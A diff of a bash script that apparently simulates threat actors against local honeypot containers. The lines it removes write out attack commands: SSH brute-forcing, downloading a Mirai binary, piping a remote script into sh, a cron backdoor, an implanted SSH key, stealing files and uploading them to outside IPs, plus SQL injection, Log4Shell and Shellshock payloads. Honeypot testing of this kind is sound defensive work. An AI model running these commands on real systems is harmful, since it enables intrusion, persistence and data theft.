@@ -28,103 +28,23 @@ RUNNING=()
 cleanup() { for c in "${RUNNING[@]:-}"; do docker rm -f "$c" >/dev/null 2>&1 || true; done; }
 trap cleanup EXIT INT TERM
 
-# actor <name> <inline-sh> — launches one attacker container, records it for cleanup.
+# actor <name> — runs scripts/attacker/actors/<name>.sh in its own throwaway
+# container (distinct source IP). Same actor files the admin "populate data"
+# button uses (backend/app/services/data_admin.py).
 actor() {
-  local name="st-atk-$1-$RANDOM"; shift
-  docker run -d --rm --name "$name" --network "$EDGE_NET" "$IMG" "$*" >/dev/null 2>&1 \
+  local name="st-atk-$1-$RANDOM"
+  docker run -d --rm --name "$name" --network "$EDGE_NET" \
+    -e COWRIE="$COWRIE" -e DIONAEA="$DIONAEA" -e HONEYTRAP="$HONEYTRAP" \
+    -e SSH_P=$SSH_P -e TELNET_P=$TELNET_P -e SMB_P=$SMB_P -e MSSQL_P=$MSSQL_P \
+    -e FTP_P=$FTP_P -e HTTP_P=$HTTP_P -e HTTP2_P=$HTTP2_P \
+    -e FAIL_PW="123456 password root toor 12345 admin 1234" \
+    "$IMG" "$(cat "scripts/attacker/actors/$1.sh")" >/dev/null 2>&1 \
     && RUNNING+=("$name") && echo "    + $name"
-}
-
-# ── threat-actor definitions ────────────────────────────────────────────────
-# Failed-then-accepted passwords: cowrie denies the first list, accepts the rest.
-FAIL_PW="123456 password root toor 12345 admin 1234"
-
-mirai_bot() {
-  actor mirai '
-    for pw in '"$FAIL_PW"'; do sshpass -p "$pw" ssh -p '"$SSH_P"' root@'"$COWRIE"' true 2>/dev/null; done
-    sshpass -p oracle ssh -p '"$SSH_P"' oracle@'"$COWRIE"' "
-      busybox; cat /proc/mounts; cat /proc/cpuinfo | grep -c processor;
-      cd /tmp; wget http://45.9.148.99/bins/mirai.arm7 -O .x; chmod +x .x; ./.x;
-      curl http://45.9.148.99/w.sh | sh; rm -rf /tmp/.x" 2>/dev/null
-    for i in 1 2 3; do nc -w2 '"$COWRIE"' '"$TELNET_P"' </dev/null; done'
-}
-
-hands_on_intruder() {
-  actor handson '
-    for pw in '"$FAIL_PW"'; do sshpass -p "$pw" ssh -p '"$SSH_P"' root@'"$COWRIE"' true 2>/dev/null; done
-    sshpass -p letmein ssh -p '"$SSH_P"' root@'"$COWRIE"' "
-      whoami; id; uname -a; hostname; cat /etc/passwd; cat /etc/shadow;
-      ls -la /root; cat /root/.bash_history; netstat -antp; ps aux;
-      crontab -l; echo \"*/5 * * * * curl -s http://45.9.148.99/c | sh\" | crontab -;
-      mkdir -p /root/.ssh; echo \"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7attacker\" >> /root/.ssh/authorized_keys;
-      chattr +i /root/.ssh/authorized_keys; history -c; rm -f /root/.bash_history" 2>/dev/null'
-}
-
-exfil_actor() {
-  actor exfil '
-    sshpass -p raspberry ssh -p '"$SSH_P"' root@'"$DIONAEA"' true 2>/dev/null
-    sshpass -p raspberry ssh -p '"$SSH_P"' root@'"$COWRIE"' "
-      find / -name \"*.sql\" -o -name \"*.pem\" -o -name id_rsa 2>/dev/null;
-      grep -r password /etc 2>/dev/null | head;
-      tar czf /tmp/loot.tgz /etc /root /var/log 2>/dev/null;
-      curl -T /tmp/loot.tgz http://185.220.101.5/upload/loot.tgz;
-      scp /tmp/loot.tgz exfil@185.220.101.5:/data/; rm -f /tmp/loot.tgz" 2>/dev/null'
-}
-
-recon_scanner() {
-  actor recon '
-    for r in 1 2 3; do
-      nmap -sT -Pn -T4 -p '"$SSH_P"','"$TELNET_P"','"$SMB_P"','"$MSSQL_P"','"$FTP_P"','"$HTTP_P"','"$HTTP2_P"',22,23,80,443,3306,3389,8080,9200,6379,5900,53,161 '"$COWRIE"' '"$DIONAEA"' '"$HONEYTRAP"' 2>/dev/null | tail -3
-      for p in 21 22 23 25 80 110 143 443 445 993 1433 2222 3306 3389 5432 5900 6379 8080 8443 9200; do
-        nc -z -w1 '"$DIONAEA"' $p 2>/dev/null; nc -z -w1 '"$HONEYTRAP"' $p 2>/dev/null; done
-      sleep 3
-    done'
-}
-
-web_attacker() {
-  local paths='/ /admin /wp-login.php /.env /.git/config /phpinfo.php
-    /?id=1%27%20OR%20%271%27=%271 /?q=%3Cscript%3Ealert(1)%3C/script%3E
-    /../../../../../../etc/passwd /index.php?page=../../../../etc/passwd
-    /cgi-bin/test.cgi /api/v1/users?filter[]=1)%20UNION%20SELECT%20*%20FROM%20users--
-    /solr/admin/cores?action=CREATE /struts2-showcase/'
-  actor web "
-    for port in $HTTP_P $HTTP2_P; do
-      for u in $paths; do
-        curl -s -o /dev/null -m 5 -A 'sqlmap/1.7#{jndi:ldap://45.9.148.99/a}' \"http://$HONEYTRAP:\$port\$u\"
-        curl -s -o /dev/null -m 5 -H 'User-Agent: () { :;}; /bin/bash -c \"id\"' \"http://$HONEYTRAP:\$port\$u\"
-      done
-    done"
-}
-
-dionaea_hunter() {
-  actor dionaea "
-    for r in 1 2 3 4; do
-      for p in $SMB_P $MSSQL_P; do
-        printf '\\x00\\x00\\x00\\x2f\\xff\\x53\\x4d\\x42\\x72\\x00\\x00\\x00\\x00' | nc -w2 $DIONAEA \$p
-      done
-      { printf 'USER anonymous\\r\\n'; sleep 1; printf 'PASS a@b.c\\r\\n'; sleep 1; printf 'SYST\\r\\n'; printf 'LIST\\r\\n'; sleep 1; printf 'RETR /etc/passwd\\r\\n'; } | nc -w4 $DIONAEA $FTP_P
-      sleep 2
-    done"
-}
-
-slow_brute() {
-  actor slowbrute '
-    for u in admin test user git postgres mysql ftp www-data jenkins deploy support pi; do
-      for pw in $u 123456 password $u123 changeme; do
-        sshpass -p "$pw" ssh -p '"$SSH_P"' "$u@'"$COWRIE"'" true 2>/dev/null
-      done
-    done
-    for u in admin root support; do nc -w2 '"$COWRIE"' '"$TELNET_P"' <<EOT 2>/dev/null
-$u
-$u
-EOT
-    done'
 }
 
 wave() {
   echo "==> wave $1/$WAVES  ($(date +%H:%M:%S))"
-  mirai_bot; hands_on_intruder; exfil_actor; recon_scanner
-  web_attacker; dionaea_hunter; slow_brute
+  for a in mirai handson exfil recon web dionaea slowbrute; do actor "$a"; done
   echo "    waiting for actors to finish..."
   local deadline=$(( $(date +%s) + 150 ))
   while [ "$(date +%s)" -lt "$deadline" ]; do
